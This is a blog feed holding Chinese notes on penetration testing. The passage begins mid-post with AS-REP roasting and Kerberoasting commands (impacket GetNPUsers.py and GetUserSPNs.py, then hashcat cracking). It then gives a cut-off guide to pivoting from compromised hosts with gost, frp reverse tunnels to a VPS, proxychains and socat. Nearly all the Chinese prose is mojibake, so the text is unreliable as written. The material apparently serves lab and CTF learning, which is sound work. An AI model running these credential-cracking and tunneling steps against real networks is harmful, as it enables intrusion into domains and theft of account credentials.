class="code"><pre><span class="line">proxychains python GetNPUsers.py &lt;åŸŸå&gt;/&lt;ç”¨æˆ·&gt; -dc-ip &lt;åŸŸæ§IP&gt; -format hashcat</span><br></pre></td></tr></table></figure><p>ä¹‹åä½¿ç”¨hashcatè¿›è¡Œçˆ†ç ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-a 0 æŒ‡å®šä¸ºå­—å…¸çˆ†ç ´æ¨¡å¼</span><br><span class="line"><span class="comment"># --force å¿½ç•¥warning</span></span><br><span class="line"><span class="comment"># -m 18200 æŒ‡å®šçˆ†ç ´æ¨¡å¼ä¸º&quot;Kerberos 5 AS-REP etype 23&quot;(18200)çš„æ ¼å¼</span></span><br><span class="line">hashcat -m 18200 --force -a 0 <span class="string">&#x27;$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:971802b84ce99050ad3c5f49d11fd0b7$xxxxxxxxxxxxx&#x27;</span> rockyou.txt</span><br></pre></td></tr></table></figure><h3 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h3><h4 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h4><p>DCåœ¨æ´»åŠ¨ç›®å½•ä¸­æŸ¥æ‰¾SPNï¼Œå¹¶ç”¨ä¸SPNå…³è”çš„æœåŠ¡å¸æˆ·åŠ å¯†ç¥¨è¯ï¼Œä»¥ä¾¿æœåŠ¡èƒ½éªŒè¯ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®ã€‚è¯·æ±‚çš„KerberosæœåŠ¡ç¥¨è¯çš„åŠ å¯†ç±»å‹æ˜¯RC4_HMAC_MD5ï¼Œè¿™æ„å‘³ç€æœåŠ¡å¸æˆ·çš„NTLMå¯†ç å“ˆå¸Œç”¨äºåŠ å¯†æœåŠ¡ç¥¨è¯ã€‚é»‘å®¢å°†æ”¶åˆ°çš„TGSç¥¨æ®ç¦»çº¿è¿›è¡Œç ´è§£ï¼Œå³å¯å¾—åˆ°ç›®æ ‡æœåŠ¡å¸å·çš„HASHï¼Œè¿™ä¸ªç§°ä¹‹ä¸ºKerberoastæ”»å‡»ã€‚å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªä¸ºåŸŸç”¨æˆ·å¸æˆ·æ³¨å†Œçš„ä»»æ„SPNï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å¸æˆ·çš„æ˜æ–‡å¯†ç çš„NTLMå“ˆå¸Œå€¼å°±å°†ç”¨äºåˆ›å»ºæœåŠ¡ç¥¨è¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨impacketä¸­çš„GetUserSPNs.py</span></span><br><span class="line">python GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; -dc-ip &lt;DCip&gt; -outputfile &lt;output_TGSs_file&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨hashcatç ´è§£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 13100 hash.txt pass.txt</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å€˜è‹¥å¯¹è¯¥è¿‡ç¨‹ç†è§£èµ·æ¥ç¨æœ‰å›°éš¾ï¼Œé‚£è‡³å°‘è¦ç‰¢è®°ä»¥ä¸‹ä¸¤ç‚¹ï¼šå…¶ä¸€ï¼Œé€šè¿‡ ASï¼ˆAuthentication Serverï¼Œè®¤è¯æœåŠ¡å™¨ï¼‰äº¤æ¢èƒ½å¤Ÿè·å– TGTï¼ˆTicket Granting Ticketï¼Œç¥¨æ®æˆæƒç¥¨æ®ï¼‰ï¼›å…¶äºŒï¼Œç»ç”± TGSï¼ˆTicket Granting Serviceï¼Œç¥¨æ®æˆæƒæœåŠ¡ï¼‰äº¤æ¢å¯ä»¥å¾—åˆ° STï¼ˆService Ticketï¼ŒæœåŠ¡ç¥¨æ®ï¼‰ã€‚å¯¹äºåŸŸæ¸—é€æ¥è¯´ï¼ŒKerberos åè®®æ˜¯åŠ¡å¿…è¦å­¦ä¹ çš„ã€‚äº†è§£ Kerberos åè®®çš„å…·ä½“æµç¨‹æœ‰åŠ©äºå¤§å®¶æ›´é€å½»åœ°ç†è§£åŸŸæ”»å‡»çš„æ‰‹æ³•ï¼Œæ˜æ™°æ¯ä¸€ä¸ªæ“ä½œæ­¥éª¤çš„å®é™…æ„ä¹‰ï¼Œé¿å…åœ¨å­¦ä¹ æˆ–è€…ç ”è¯»ä»–äººçš„WPæ—¶è¿‡äºå›°æƒ‘ï¼Œåªä¼šç›²ç›®åœ°å¤åˆ¶å‘½ä»¤å»æ‰§è¡Œã€‚</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç†ã®å°è®°</title>
    <link href="https://bowuchuling.github.io/posts/daili.html"/>
    <id>https://bowuchuling.github.io/posts/daili.html</id>
    <published>2024-08-23T18:36:29.829Z</published>
    <updated>2024-08-23T18:38:29.673Z</updated>
    
    <content type="html"><![CDATA[<h1>ä»£ç†ã®å°è®°</h1><p>è‡ªåˆ·äº†äº‘å¢ƒä¹‹åï¼Œä¼—å¤šå¸ˆå‚…çº·çº·å‘æˆ‘è¯¢é—®æœ‰å…³äº‘å¢ƒæˆ–è€…åŸŸçš„å„ç±»é—®é¢˜ï¼Œå…¶ä¸­ä¸ä¹é›¶åŸºç¡€çš„ctferã€‚è€Œè¯¢é—®é¢‘ç‡æœ€é«˜çš„å½“å±ä»£ç†æ­å»ºé—®é¢˜ã€‚ä»£ç†çš„æ­å»ºæ˜¯è¿›è¡Œå†…ç½‘æ¸—é€è‡³å…³é‡è¦çš„ä¸€ç¯.ã€‚æ‰€ä»¥æœ‰æ„å†™ä¸€ç¯‡æ–‡ç« ï¼Œæ¥ä»‹ç»ä¸€ä¸‹å½“ä¸‹ä¸»æµçš„ä»£ç†åŠå…¶ä½¿ç”¨æ–¹æ³•ã€‚ä»¥ä¸‹çš„è®²è§£ä»…ä»£è¡¨ä¸ªäººè§è§£ï¼Œè‹¥å­˜åœ¨é”™è¯¯ä¹‹å¤„ï¼Œè¿˜æœ›å¸ˆå‚…ä»¬èƒ½å¤Ÿä¸åæŒ‡æ­£ã€‚çƒçƒï¼š2161992897</p><h2 id="ç¯å¢ƒä»‹ç»">ç¯å¢ƒä»‹ç»</h2><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824011349252.png" alt="image-20240824011349252"></p><p>æˆ‘è¿™é‡Œå‡†å¤‡äº†ä¸‰å°æœºå™¨ï¼Œwin1æœ‰ä¸¤å¼ ç½‘å¡ï¼Œ1å¼ æ˜¯18ï¼Œå¯ä»¥ä¸win2é€šè®¯ï¼Œä¸€å¼ æ˜¯10ï¼ˆä»…ä¸»æœºæ¨¡å¼ï¼‰ä¸PCæœºé€šè®¯ï¼Œæ­¤æ—¶çš„PCæœºæ˜¯æ— æ³•ä¸18ç½‘æ®µæœºå™¨è¿›è¡Œé€šè®¯çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸ªäººPCæœºå™¨æ¥pingä¸€ä¸‹è¿™ä¸¤å°æœºå™¨ã€‚</p><h3 id="PC-ping-18ç½‘æ®µ">PC ping 18ç½‘æ®µ</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824000239161.png" alt="image-20240824000239161"></p><p>å¯ä»¥å‘ç°PC ping 18ç½‘æ®µçš„ä¸¤å°æœºå™¨éƒ½æ˜¯ä¸é€šçš„</p><h3 id="PC-ping-139ç½‘æ®µ">PC ping 139ç½‘æ®µ</h3><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824000319145.png" alt="image-20240824000319145"></p><p>å¯ä»¥å‘ç°139ç½‘æ®µæ˜¯å®Œå…¨å¯é€šçš„æ­¤å¤„çš„win1å°±æ˜¯ç”¨æ¥æ¨¡æ‹Ÿæˆ‘ä»¬æ¸—é€è¿‡ç¨‹æ‰€æ‹¿ä¸‹çš„è·³æ¿æœºï¼Œæƒ³è¦å¯¹è·³æ¿æœºå†…ç½‘è¿›è¡Œæ¸—é€ï¼Œå°±éœ€è¦æ­å»ºä»£ç†æ¥è®¿é—®å†…ç½‘ä¸»æœº</p><h2 id="ä»£ç†å·¥å…·ç®€ä»‹">ä»£ç†å·¥å…·ç®€ä»‹</h2><p>å…ˆç®€å•è¯´ä¸‹ï¼Œæ‰€æœ‰çš„ä»£ç†è¿æ¥å·¥å…·çš„å…±åŒç‰¹ç‚¹éƒ½æ˜¯å»è¿æ¥ä¸€å¯¹æˆ–è€…å¤šå¯¹ipå’Œç«¯å£ï¼Œæ­¤æ—¶å¸ˆå‚…ä»¬åªéœ€è¦çŸ¥é“æˆ‘ä»¬è¦è¿æ¥ä¸€å¯¹ipå’Œç«¯å£å³å¯ã€‚</p><h3 id="proxifier">proxifier</h3><p>æ­¤å·¥å…·ä¸ºwindowsä»£ç†å·¥å…·ï¼Œæˆ‘æœ€å–œæ¬¢ç”¨çš„ä»£ç†è¿æ¥å·¥å…·ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚æ‰“å¼€è½¯ä»¶åï¼Œç‚¹å‡»é…ç½®æ–‡ä»¶çš„ä»£ç†æœåŠ¡å™¨é€‰é¡¹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824002544429.png" alt="image-20240824002544429"></p><p>ç‚¹å‡»æ·»åŠ </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824002649601.png" alt="image-20240824002649601"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¡«å…¥å¯¹åº”çš„ipå’Œç«¯å£ï¼Œç„¶åé€‰æ‹©å¯¹åº”çš„åè®®ï¼ˆä¸€èˆ¬ä¸ºsocks5ï¼‰ï¼Œç„¶åä¸€è·¯ç‚¹å‡»ç¡®å®šé€€å›åˆ°å·¥å…·åˆå§‹ç•Œé¢å³å¯ã€‚ç®€å•æä¸€ä¸‹è¿™é‡Œçš„æ£€æŸ¥é€‰é¡¹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824002902215.png" alt="image-20240824002902215"></p><p>ç‚¹å¼€åï¼Œå…¶å³ä¸Šè§’æœ‰ä¸€ä¸ªæµ‹è¯•è®¾ç½®é€‰é¡¹ï¼Œç‚¹å‡»è®¿é—®åï¼Œä»–ä¼šæ ¹æ®è®¾ç½®é‡Œé¢çš„é…ç½®å»è®¿é—®å¯¹åº”ç½‘å€ï¼Œé€šè¿‡æ˜¯å¦å¯è¾¾æ¥åˆ¤æ–­ä»£ç†æ˜¯å¦æ­å»ºæˆåŠŸï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œé…ç½®çš„æ˜¯ç™¾åº¦ï¼Œå®ƒå°±ä¼šå»è®¿é—®ç™¾åº¦æ¥åˆ¤æ–­ä»£ç†æ˜¯å¦æ­å»ºæˆåŠŸã€‚éœ€è¦æ³¨æ„çš„æ˜¯çº¿ä¸‹èµ›æ˜¯æ— ç½‘ç»œçŠ¶æ€ï¼Œæ‰€ä»¥ç›®æ ‡ä¸»æœºè¿™é‡Œå¦‚æœè®¾ç½®çš„æ˜¯ç½‘ç»œä¸Šçš„åœ°å€ï¼Œåˆ™å…¶ä¼šä¸€ç›´è¿”å›å¤±è´¥ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€ä»£ç†ä¹Ÿæ­å»ºå¤±è´¥ã€‚</p><p>è¿”å›åˆå§‹ç•Œé¢åï¼Œç‚¹å‡»ä»£ç†è§„åˆ™</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824003210008.png" alt="image-20240824003210008"></p><p>è¿™é‡Œæ ¹æ®è‡ªå·±çš„éœ€æ±‚è®¾ç½®ï¼Œç”±äºæˆ‘æ˜¯æ‡’bï¼Œæ‰€ä»¥æˆ‘ç›´æ¥å…¨éƒ¨é€‰ä¸Šï¼ˆå°†åŠ¨ä½œé‚£éƒ¨åˆ†å…¨éƒ¨é€‰æˆè‡ªå·±åˆšåˆšæ‰€è®¾ç½®çš„ä»£ç†ï¼‰ï¼Œé¿å…å‡ºç°æŸäº›å·¥å…·èµ°ä¸ä¸Šä»£ç†çš„æƒ…å†µ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824003318957.png" alt="image-20240824003318957"></p><p>å¦å¤–ï¼Œè¿™é‡Œè¿˜å¯ä»¥è®¾ç½®ç›®æ ‡ä¸»æœºï¼Œä¾‹å¦‚æ­¤ä»£ç†æ˜¯ç”¨æ¥è®¿é—®18ç½‘æ®µçš„ï¼Œåˆ™å¯ä»¥è®¾ç½®ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.18.*</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ‰€æœ‰èµ°å‘18ç½‘æ®µçš„æµé‡éƒ½ä¼šèµ°ä¸Šä»£ç†äº†ã€‚</p><h3 id="proxychains4">proxychains4</h3><p>æ­¤å·¥å…·ä¸ºlinuxä»£ç†å·¥å…·ï¼Œå…¶ç”¨æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°å¯¹åº”çš„ipå’Œç«¯å£åï¼Œæˆ‘ä»¬ç¼–è¾‘ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>æ»‘åˆ°æœ€ä¸‹é¢</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824003752973.png" alt="image-20240824003752973"></p><p>åœ¨è¿™é‡ŒæŒ‰ç…§å¦‚ä¸‹æ ¼å¼å°†ä»£ç†çš„ipå’Œç«¯å£å¡«å†™è¿›å»ï¼Œæ— ç”¨çš„ipå’Œportéœ€è¦æ³¨é‡Šæ‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 ip ç«¯å£</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨çš„æ—¶å€™åœ¨å‘½ä»¤å‰é¢åŠ ä¸Šä¸€æ¡proxychains4å³å¯ï¼Œä¾‹å¦‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 curl http://192.168.18.129</span><br></pre></td></tr></table></figure><p>è¿™æ ·æµé‡å°±å¯ä»¥èµ°ä¸Šæˆ‘ä»¬æ­å»ºå¥½çš„sock5ä»£ç†äº†ï¼Œä½†æ˜¯æŸäº›åº•å±‚æµé‡æ˜¯èµ°ä¸ä¸Šproxychains4ï¼Œéœ€è¦å•ç‹¬è§£å†³ä¸€ä¸‹ã€‚å¦‚æœé…ç½®æ–‡ä»¶å†²çªï¼Œå¯ä»¥ä½¿ç”¨-f å‚æ•°æŒ‡å®šé…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -f /etc/proxychains4.conf curl http://192.168.18.129</span><br></pre></td></tr></table></figure><h2 id="æ­£å‘-åå‘ä»£ç†">æ­£å‘ &amp; åå‘ä»£ç†</h2><p>æ­£å‘ä»£ç†å’Œåå‘ä»£ç†çš„é€‰æ‹©å’Œé¶æœºçš„é˜²ç«å¢™é…ç½®å…¶å®æœ‰ç€å¯†åˆ‡çš„å…³ç³»ã€‚å½“é˜²ç«å¢™çš„å…¥ç«™è§„åˆ™é…ç½®çš„ç›¸å¯¹ä¸¥æ ¼æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸é€‰æ‹©åå‘æ­å»ºä»£ç†ï¼Œå³è®©é¶æœºä¸»åŠ¨å‡ºæ¥ã€‚å½“é˜²ç«å¢™çš„å‡ºç«™è§„åˆ™ç›¸å¯¹ä¸¥æ ¼æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸é€‰æ‹©æ­£å‘æ­å»ºä»£ç†ï¼Œå³æˆ‘ä»¬ä¸»åŠ¨å¯»æ‰¾é¶æœºã€‚é€šå¸¸å…¥ç«™è§„åˆ™ä¼šæ¯”å‡ºç«™è§„åˆ™ä¸¥æ ¼å¾ˆå¤šã€‚</p><h2 id="ä»£ç†æ­å»º">ä»£ç†æ­å»º</h2><h3 id="Gost">Gost</h3><h4 id="é¡¹ç›®ä»‹ç»">é¡¹ç›®ä»‹ç»</h4><p>æ­£å‘ä»£ç†å·¥å…·</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/ginuerzh/gost">https://github.com/ginuerzh/gost</a></p><p>gostæ˜¯æˆ‘æœ€å¸¸ç”¨çš„ä¸€æ¬¾ä»£ç†è½¯ä»¶ï¼Œå¯¹äºé¶åœºè€Œè¨€ï¼Œæ–‡ä»¶è½åœ°ä¸å†æ˜¯ä¸€ä¸ªæ£˜æ‰‹çš„é—®é¢˜ï¼Œgostå¯ä»¥ä»¥ä¸€ç§æ–¹ä¾¿ä¸”å¿«æ·çš„æ–¹å¼æ­å»ºä»£ç†ï¼Œä¸”å…¶ä½¿ç”¨æ–¹æ³•ä¹Ÿå¼‚å¸¸çš„ç®€å•ï¼Œå¯¹äºlinuxè€Œè¨€ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¿«é€Ÿçš„å¼€å¯ä¸€ä¸ªæ ‡å‡†çš„HTTP/SOCKS5ä»£ç†ï¼Œä»–ä¼šå¼€å¯è·³æ¿æœºçš„10000ç«¯å£ä½œä¸ºä»£ç†ç«¯å£ï¼Œåé¢ä½¿ç”¨ä»£ç†å·¥å…·è¿æ¥è·³æ¿æœºçš„ipåŠ10000ç«¯å£å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gost -L=:10000 &amp;</span><br></pre></td></tr></table></figure><p>windowsåŒç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gost.exe -L=:10000 &amp;</span><br></pre></td></tr></table></figure><h4 id="gostæ¼”ç¤º">gostæ¼”ç¤º</h4><p>å°†gostä¸Šä¼ åˆ°è¢«æ§é¶æœºï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gost.exe -L=:10000 &amp;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824012855007.png" alt="image-20240824012855007"></p><p>å‡ºç°ä¸‹é¢é‚£ä¸€ä¸²jsonæ–‡ä»¶å°±æ˜¯å¯åŠ¨æˆåŠŸäº†ï¼Œå¦‚æœç«¯å£è¢«å ç”¨ï¼Œåˆ™jsonä¼šè¿”å›ç«¯å£å·²è¢«å ç”¨çš„æç¤ºã€‚ä»£ç†æ­å»ºç»“æŸåæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ä»£ç†å·¥å…·æ¥è¿æ¥æ­¤ä»£ç†è¿›è€Œè®¿é—®è·³æ¿æœºå†…ç½‘ï¼ˆå³18ç½‘æ®µï¼‰ï¼Œåˆ©ç”¨proxifierå¡«å†™å¥½ipå’Œç«¯å£ï¼ˆproxychains4åŒç†ï¼‰</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.10.10.129</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure><p>è®¿é—®18.129ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824013011885.png" alt="image-20240824013011885"></p><h3 id="Frp">Frp</h3><h4 id="é¡¹ç›®ä»‹ç»-2">é¡¹ç›®ä»‹ç»</h4><p>åå‘ä»£ç†å·¥å…·</p><p>å·¥å…·åœ°å€ï¼š<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>ç›¸å¯¹äºgostï¼Œfrpå°±æ˜¾å¾—æ¯”è¾ƒè‡ƒè‚¿ï¼Œå®ƒåˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¸¤éƒ¨åˆ†ï¼Œæ­¤å¤„ä»…ä»‹ç»ä¸€å±‚ä»£ç†æƒ…å†µä¸‹çš„frpæ­å»ºè¿‡ç¨‹ã€‚</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824014814131.png" alt="image-20240824014814131"></p><p>å…ˆç»™å‡ºåŸºäºæ­¤æ‹“è¡¥å›¾çš„frpé…ç½®</p><p>frpc.iniï¼ˆå®¢æˆ·ç«¯ï¼Œå³é¶æœºï¼‰</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">8.8</span>.<span class="number">8.8</span>  //æœåŠ¡ç«¯çš„ip</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span>     //æœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£</span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_socks6]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">10000</span>   //è®©æœåŠ¡ç«¯å¼€å¯çš„ç«¯å£ï¼Œæä¾›socks5ä»£ç†</span><br><span class="line"><span class="attr">plugin</span> = socks5  //æŒ‡æ˜åè®®ç±»å‹æ˜¯socks5</span><br></pre></td></tr></table></figure><p>frps.iniï¼ˆæœåŠ¡ç«¯ï¼Œå³VPSï¼‰</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span>   //ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œä¾›æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯é€šè®¯</span><br></pre></td></tr></table></figure><h4 id="frpæ¼”ç¤º">frpæ¼”ç¤º</h4><p>å…ˆå°†frpsä¸Šä¼ vpsï¼Œæ‰§è¡Œå‘½ä»¤å¼€å¯ç›‘å¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>å†å°†frpcä¸Šä¼ åˆ°win1ï¼Œæ‰§è¡Œå‘½ä»¤ä¸»åŠ¨è¿æ¥å†™å¥½çš„æœåŠ¡ç«¯ipå’Œç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>è¿æ¥æˆåŠŸåï¼Œä½¿ç”¨ä»£ç†å·¥å…·è¿æ¥8.8.8.8 10000å³å¯è®¿é—®win2ï¼ˆå³win1å†…ç½‘ï¼‰</p><h4 id="ç«¯å£æ˜ å°„">ç«¯å£æ˜ å°„</h4><p>ä¸ªäººfrpå†æ¯”è¾ƒå¸¸ç”¨çš„åŠŸèƒ½å°±æ˜¯frpçš„ç«¯å£æ˜ å°„äº†ï¼Œé€‚ç”¨äºä¸€äº›åŠå…¶ç‰¹æ®Šçš„æƒ…å†µã€‚</p><p>ä¾‹å¦‚ä½ æƒ³å°†æœ¬åœ°çš„25565ç«¯å£æ˜ å°„åˆ°VPSçš„7779ç«¯å£ï¼Œè¾¾æˆè®¿é—®VPSçš„7779ç«¯å£å°±æ˜¯è®¿é—®æœ¬åœ°çš„25565ç«¯å£ï¼Œé‚£ä½ å¯ä»¥è¿™æ ·æ“ä½œ</p><p>frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[tcp_1200]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">7779</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">25565</span></span><br></pre></td></tr></table></figure><p>frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">8.8</span>.<span class="number">8.8</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_socks6]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7779</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">25565</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•å°†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å¯åŠ¨åå³å¯å®Œæˆæ˜ å°„æ“ä½œã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç§ä½æƒé™çš„ç«¯å£è½¬å‘æ“ä½œé¡ºé“æä¸€å˜´ï¼Œé€‚ç”¨äºæŸäº›ç‰¹æ®Šæƒ…å†µã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:8080,reuseaddr,fork tcp:8.8.8.8:80</span><br></pre></td></tr></table></figure><p>æ­¤å‘½ä»¤å¯ä»¥å°†æœ¬åœ°çš„8080ç«¯å£çš„æµé‡å…¨éƒ¨è½¬å‘åˆ°VPSçš„80ç«¯å£ä¸Š</p><h2 id="ä»£ç†é“¾">ä»£ç†é“¾</h2><p>å¯¹äºå¤šå±‚å†…ç½‘çš„æƒ…å†µï¼Œé€šå¸¸éœ€è¦æ­å»ºä»£ç†é“¾è¿›è¡Œæ“ä½œï¼Œæ‰€è°“ä»£ç†é“¾å…¶å®å°±æ˜¯å¤šæ­å»ºå‡ å±‚ä»£ç†ç½¢äº†ã€‚æ–°çš„ç½‘ç»œçŠ¶å†µå¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240824021306765.png" alt="image-20240824021306765"></p><h3 id="æ­å»ºä»£ç†é“¾">æ­å»ºä»£ç†é“¾</h3><h4 id="gost">gost</h4><p>è¿™ä¸ªç®€å•ï¼Œä¹‹å‰æ­å»ºä¸€å±‚ä»£ç†çš„æ—¶å€™å·²ç»åœ¨win1ä¸Šè¿è¡Œäº†ä¸€ä¸ªgostï¼Œæ­¤æ—¶æˆ‘ä»¬åªéœ€è¦åœ¨win2å†ä¸Šä¼ ä¸€ä¸ªgostï¼Œåˆ©ç”¨ä¸Šé¢çš„æ“ä½œå†æ‰§è¡Œä¸€æ¬¡å³å¯æ­å»ºå¥½ç¬¬äºŒå±‚ä»£ç†</p><h4 id="frp">frp</h4><p>frpç›¸å¯¹ç»•ä¸€äº›ï¼Œä½†æ“ä½œå’Œæ­å»ºä¸€å±‚æ˜¯ä¸€æ 